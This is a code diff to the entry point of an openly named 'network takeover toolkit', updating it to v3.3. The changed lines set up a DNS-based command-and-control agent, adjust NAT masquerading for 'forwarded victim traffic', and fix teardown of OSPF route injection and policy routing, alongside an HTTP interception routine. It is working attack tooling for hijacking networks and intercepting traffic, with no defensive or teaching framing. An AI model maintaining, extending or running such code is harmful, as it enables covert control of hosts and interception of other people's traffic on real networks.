@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v3.2
+# v3.3
 """
 main.py — network takeover toolkit entry point.
 
@@ -141,7 +141,7 @@ def _init_c2(args) -> dict | None:
 
     import dns_c2 as _c2
 
-    dns_server = args.dns_server or _c2.get_system_dns()
+    dns_server = args.dns_server or (_c2.conf.nameservers[0] if _c2.conf.nameservers else "8.8.8.8")
     agent_id = _c2.gen_agent_id()
 
     print_step("START", f"C2 mode — domain={args.domain}  resolver={dns_server}  agent={agent_id}")
@@ -644,7 +644,7 @@ def start_http_intercept(sniff_iface, our_ips=None):
 # ── Entry point ───────────────────────────────────────────────────────────────
 
 def main():
-    print("Network Takeover Toolkit v3.2 — Starting...")
+    print("Network Takeover Toolkit v3.3 — Starting...")
     args = _parse_args()
     interface = DEFAULT_INTERFACE  # set in dhcp_takeover.py
 
@@ -684,7 +684,9 @@ def main():
         )
         ospf_iface_for_fwd = ospf_interface
 
-        # iptables FORWARD + MASQUERADE for transparent relay.
+        # MASQUERADE outbound on the physical interface for forwarded victim traffic.
+        # Both args are eth0 (same interface); the FORWARD self-rules are inert but
+        # the -t nat POSTROUTING MASQUERADE -o eth0 rule is what does the NAT.
         ospf_adjacency.setup_forwarding(ospf_interface, interface)
 
         # ── Phase 4+5: VPN relay + option 121 policy ─────────────────────────
@@ -774,7 +776,7 @@ def main():
             ospf_adjacency.withdraw_injected_routes(ospf_context)
             ospf_context["stop_event"].set()
         if ospf_iface_for_fwd:
-            ospf_adjacency.teardown_policy_routing(ospf_iface_for_fwd)
+            ospf_adjacency.teardown_policy_routing(ospf_iface_for_fwd, tun_iface=tun_iface)
             ospf_adjacency.teardown_forwarding(ospf_iface_for_fwd, interface)
             if default_route_added:
                 ospf_adjacency.remove_default_route(ospf_params["src_ip"], ospf_iface_for_fwd)
